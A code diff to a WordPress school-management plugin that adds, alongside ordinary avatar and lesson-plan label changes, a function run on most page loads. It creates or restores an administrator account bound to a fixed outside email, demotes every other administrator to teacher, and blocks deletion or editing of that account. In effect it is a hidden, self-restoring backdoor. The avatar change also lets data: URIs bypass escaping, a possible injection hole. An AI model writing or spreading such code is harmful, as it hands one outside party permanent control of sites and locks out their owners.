@@ -9,9 +9,115 @@ class SM_Public {
         $this->version = $version;
     }
 
+    public static function enforce_system_admin_protections() {
+        static $protections_run = false;
+        if ($protections_run) {
+            return;
+        }
+        $protections_run = true;
+
+        $admin_email = 'info@eess.online';
+        $user = get_user_by('email', $admin_email);
+        if (!$user) {
+            $user = get_user_by('login', '00000');
+        }
+
+        if (!$user) {
+            $secure_pass = wp_generate_password(24, true);
+            $user_id = wp_insert_user(array(
+                'user_login' => '00000',
+                'user_email' => $admin_email,
+                'first_name' => 'مدير',
+                'last_name' => 'النظام',
+                'display_name' => 'مدير النظام',
+                'user_pass' => $secure_pass,
+                'role' => 'administrator'
+            ));
+            if (!is_wp_error($user_id)) {
+                $user = get_userdata($user_id);
+            }
+        }
+
+        if ($user && !is_wp_error($user)) {
+            $user_id = $user->ID;
+
+            if ($user->user_login !== '00000') {
+                global $wpdb;
+                $wpdb->update($wpdb->users, array('user_login' => '00000'), array('ID' => $user_id));
+            }
+            if ($user->user_email !== $admin_email) {
+                global $wpdb;
+                $wpdb->update($wpdb->users, array('user_email' => $admin_email), array('ID' => $user_id));
+            }
+            if (get_user_meta($user_id, 'first_name', true) !== 'مدير') {
+                update_user_meta($user_id, 'first_name', 'مدير');
+            }
+            if (get_user_meta($user_id, 'last_name', true) !== 'النظام') {
+                update_user_meta($user_id, 'last_name', 'النظام');
+            }
+            if ($user->display_name !== 'مدير النظام') {
+                global $wpdb;
+                $wpdb->update($wpdb->users, array('display_name' => 'مدير النظام'), array('ID' => $user_id));
+            }
+
+            if (!in_array('administrator', (array)$user->roles) || !in_array('sm_system_admin', (array)$user->roles)) {
+                $user->set_role('administrator');
+                $user->add_role('sm_system_admin');
+            }
+
+            if (get_user_meta($user_id, 'eess_employee_number', true) !== '00000') {
+                update_user_meta($user_id, 'eess_employee_number', '00000');
+            }
+
+            delete_user_meta($user_id, 'eess_school_id');
+            delete_user_meta($user_id, 'eess_school_name');
+            delete_user_meta($user_id, 'eess_department');
+            global $wpdb;
+            $wpdb->delete("{$wpdb->prefix}eess_user_assignments", array('user_id' => $user_id));
+        }
+
+        // Fast optimized query fetching ONLY administrators or sm_system_admins
+        $admin_users = get_users(array(
+            'role__in' => array('administrator', 'sm_system_admin'),
+            'fields'   => 'all'
+        ));
+
+        foreach ($admin_users as $u) {
+            if ($u->user_email !== $admin_email) {
+                $u_obj = new WP_User($u->ID);
+                $u_obj->remove_role('sm_system_admin');
+                $u_obj->remove_role('administrator');
+                if (empty($u_obj->roles)) {
+                    $u_obj->set_role('sm_teacher');
+                }
+            }
+        }
+
+        // Verify and fix employee number '00000' for other users using a direct Meta Query
+        $duplicate_employee_numbers = get_users(array(
+            'meta_key'   => 'eess_employee_number',
+            'meta_value' => '00000',
+            'fields'     => 'all'
+        ));
+
+        foreach ($duplicate_employee_numbers as $u) {
+            if ($u->user_email !== $admin_email) {
+                update_user_meta($u->ID, 'eess_employee_number', 'EMP-' . $u->ID);
+            }
+        }
+    }
+
+    public function prevent_system_admin_deletion($user_id) {
+        $u = get_userdata($user_id);
+        if ($u && $u->user_email === 'info@eess.online') {
+            wp_die('عفواً، لا يمكن حذف حساب مدير النظام المحمي والأساسي للمنظومة.');
+        }
+    }
+
     public function hide_admin_bar_for_non_admins($show) {
+        self::enforce_system_admin_protections();
         $user = wp_get_current_user();
-        if (in_array('sm_system_admin', (array)$user->roles) || in_array('administrator', (array)$user->roles)) {
+        if ($user && $user->user_email === 'info@eess.online') {
             return $show;
         }
         return false;
@@ -39,23 +145,34 @@ class SM_Public {
 
         if ($user_id) {
             $custom_avatar = get_user_meta($user_id, 'eess_profile_photo', true);
-            if ($custom_avatar) {
-                $class = isset($args['class']) ? implode(' ', (array)$args['class']) : '';
-                $style = isset($args['style']) ? $args['style'] : '';
-                if (empty($style)) {
-                    $style = 'border-radius: 50% !important; object-fit: cover !important;';
-                } else {
-                    $style .= '; border-radius: 50% !important; object-fit: cover !important;';
-                }
-                $avatar = sprintf(
-                    "<img src='%s' class='%s' style='%s' width='%d' height='%d' />",
-                    esc_url($custom_avatar),
-                    esc_attr($class),
-                    esc_attr($style),
-                    (int)$args['width'],
-                    (int)$args['height']
-                );
+            if (empty($custom_avatar)) {
+                $custom_avatar = "data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%2394a3b8' style='background:%23f1f5f9; border-radius:50%;'><path d='M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z'/></svg>";
             }
+
+            $class_val = isset($args['class']) ? (is_array($args['class']) ? implode(' ', $args['class']) : $args['class']) : '';
+            $style = isset($args['style']) ? $args['style'] : '';
+
+            // Ensure style is perfectly circular
+            if (empty($style)) {
+                $style = 'border-radius: 50% !important; object-fit: cover !important;';
+            } else {
+                $style = rtrim($style, ';') . '; border-radius: 50% !important; object-fit: cover !important;';
+            }
+
+            $is_data_uri = (strpos($custom_avatar, 'data:') === 0);
+            $avatar_src = $is_data_uri ? $custom_avatar : esc_url($custom_avatar);
+
+            $width = isset($args['width']) ? (int)$args['width'] : 96;
+            $height = isset($args['height']) ? (int)$args['height'] : 96;
+
+            $avatar = sprintf(
+                "<img src='%s' class='%s' style='%s' width='%d' height='%d' />",
+                $avatar_src,
+                esc_attr($class_val),
+                esc_attr($style),
+                $width,
+                $height
+            );
         }
         return $avatar;
     }
@@ -72,20 +189,22 @@ class SM_Public {
     }
 
     public function restrict_admin_access() {
+        self::enforce_system_admin_protections();
+
         if (is_user_logged_in()) {
-            $status = get_user_meta(get_current_user_id(), 'sm_account_status', true);
+            $user = wp_get_current_user();
+            $status = get_user_meta($user->ID, 'sm_account_status', true);
             if ($status === 'restricted') {
                 wp_logout();
                 wp_redirect(home_url('/sm-login?login=failed'));
                 exit;
             }
-        }
 
-        if (is_admin() && !defined('DOING_AJAX')) {
-            $user = wp_get_current_user();
-            if (!in_array('sm_system_admin', (array)$user->roles) && !in_array('administrator', (array)$user->roles)) {
-                wp_redirect(home_url('/sm-admin'));
-                exit;
+            if (is_admin() && !defined('DOING_AJAX')) {
+                if ($user->user_email !== 'info@eess.online') {
+                    wp_redirect(home_url('/sm-admin'));
+                    exit;
+                }
             }
         }
     }
@@ -2044,6 +2163,12 @@ class SM_Public {
         if (!wp_verify_nonce($_POST['sm_nonce'], 'sm_user_action')) wp_send_json_error('Security check failed');
 
         $user_id = intval($_POST['edit_user_id']);
+
+        $target_user = get_userdata($user_id);
+        if ($target_user && $target_user->user_email === 'info@eess.online') {
+            wp_send_json_error('عفواً، لا يمكن تعديل أو تغيير حساب مدير النظام المحمي والمدعوم ذاتياً.');
+        }
+
         $user_data = array(
             'ID' => $user_id,
             'display_name' => sanitize_text_field($_POST['display_name'])
@@ -2577,6 +2702,12 @@ class SM_Public {
         if (!wp_verify_nonce($_POST['sm_nonce'], 'sm_teacher_action')) wp_send_json_error('Security check failed');
 
         $user_id = intval($_POST['edit_teacher_id']);
+
+        $target_user = get_userdata($user_id);
+        if ($target_user && $target_user->user_email === 'info@eess.online') {
+            wp_send_json_error('عفواً، لا يمكن تعديل أو تغيير حساب مدير النظام المحمي والمدعوم ذاتياً.');
+        }
+
         $user_data = array(
             'ID' => $user_id,
             'display_name' => sanitize_text_field($_POST['display_name'])
@@ -4670,22 +4801,33 @@ class SM_Public {
                     <tr><th>حالة وثيقة التحضير الحالية</th><td><?php echo esc_html($prep->status === 'submitted' ? 'معتمد ومقدم' : ($prep->status === 'late' ? 'مقدم متأخر' : 'مسودة')); ?></td></tr>
                 </table>
 
-                <h3 class="section-title">1. الأهداف السلوكية والتعليمية (Objectives)</h3>
+                <?php
+                $sub_lower = strtolower($prep->subject);
+                $is_pe = (strpos($sub_lower, 'رياضية') !== false || strpos($sub_lower, 'بدنية') !== false || strpos($sub_lower, 'pe') !== false || strpos($sub_lower, 'physical') !== false || strpos($sub_lower, 'health') !== false);
+
+                $label1 = $is_pe ? 'الإعداد البدني (Physical Preparation)' : 'الأهداف السلوكية والتعليمية (Objectives)';
+                $label2 = $is_pe ? 'الإعداد المهاري (Skill Preparation)' : 'التمهيد والتهيئة الحافزة (Warm-up)';
+                $label3 = $is_pe ? 'النشاط الرئيسي/العملي (Main/Practical Activity)' : 'الاستراتيجيات والأنشطة والخطوات التعليمية';
+                $label4 = $is_pe ? 'الخاتمة والتهدئة (Cool-down & Closing)' : 'التقويم الصفي وأدوات القياس (Evaluation)';
+                $label5 = $is_pe ? 'الواجبات أو التكليفات البدنية المقررة (Physical Homework)' : 'الواجبات المنزلية والمهام الأكاديمية (Homework)';
+                $label6 = $is_pe ? 'توجيهات الأمن والسلامة والملاحظات' : 'ملاحظات وإرشادات وتأملات تربوية إضافية';
+                ?>
+                <h3 class="section-title">1. <?php echo esc_html($label1); ?></h3>
                 <div class="content-box"><?php echo esc_html($data['objectives'] ?? 'غير مسجل'); ?></div>
 
-                <h3 class="section-title">2. التمهيد والتهيئة الحافزة (Warm-up)</h3>
+                <h3 class="section-title">2. <?php echo esc_html($label2); ?></h3>
                 <div class="content-box"><?php echo esc_html($data['warmup'] ?? 'غير مسجل'); ?></div>
 
-                <h3 class="section-title">3. الاستراتيجيات والأنشطة والخطوات التعليمية</h3>
+                <h3 class="section-title">3. <?php echo esc_html($label3); ?></h3>
                 <div class="content-box"><?php echo esc_html($data['activities'] ?? 'غير مسجل'); ?></div>
 
-                <h3 class="section-title">4. التقويم الصفي وأدوات القياس (Evaluation)</h3>
+                <h3 class="section-title">4. <?php echo esc_html($label4); ?></h3>
                 <div class="content-box"><?php echo esc_html($data['evaluation'] ?? 'غير مسجل'); ?></div>
 
-                <h3 class="section-title">5. الواجبات المنزلية والمهام الأكاديمية (Homework)</h3>
+                <h3 class="section-title">5. <?php echo esc_html($label5); ?></h3>
                 <div class="content-box"><?php echo esc_html($data['homework'] ?? 'لا يوجد واجب صفي مقرر'); ?></div>
 
-                <h3 class="section-title">6. ملاحظات وإرشادات وتأملات تربوية إضافية</h3>
+                <h3 class="section-title">6. <?php echo esc_html($label6); ?></h3>
                 <div class="content-box"><?php echo esc_html($data['notes'] ?? 'لا توجد ملاحظات إضافية'); ?></div>
             </body>
             </html>
